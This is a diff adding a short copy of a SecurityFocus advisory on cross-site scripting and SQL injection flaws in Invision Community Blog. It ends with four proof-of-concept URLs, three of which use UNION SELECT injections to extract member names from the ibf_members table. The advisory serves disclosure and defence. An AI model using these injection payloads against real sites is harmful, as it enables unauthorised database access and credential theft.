@@ -1,0 +1,13 @@
+source: http://www.securityfocus.com/bid/13910/info
+
+Multiple input validation vulnerabilities reportedly affect Invision Community Blog. These issues are due to a failure of the application to properly sanitize user-supplied input prior to using it to carry out critical actions.
+
+The first issue is a cross-site scripting issue and the second set of issues are SQL injection issues.
+
+An attacker may leverage these issues to carry out cross-site scripting and SQL injection attacks against the affected application. This may result in the theft of authentication credentials, destruction or disclosure of sensitive data, and potentially other attacks. 
+
+SQL Injection
+http://www.example.com/index.php?automodule=blog&blogid=1&cmd=editentry&eid=99%20UNION%20SELECT%201,0,0,name,0,0,0,0,0,0,0,0,0,0,0,0,0,0%20FROM%20ibf_members%20WHERE%201/*
+http://www.example.com/index.php?automodule=blog&blogid=1&cmd=replyentry&eid=99%20UNION%20SELECT%201,0,0,name,0,0,0,0,0,0,0,0,0,0,0,0,0,0%20FROM%20ibf_members%20WHERE%201/*
+http://www.example.com/index.php?automodule=blog&blogid=1&cmd=editcomment&eid=1&cid=-99%20UNION%20SELECT%201,0,0,0,0,0,0,0,0,0,0,0,0,name%20FROM%20ibf_members%20WHERE%201/*
+http://www.example.com/index.php?automodule=blog&blogid=1&cmd=aboutme&mid=2' 
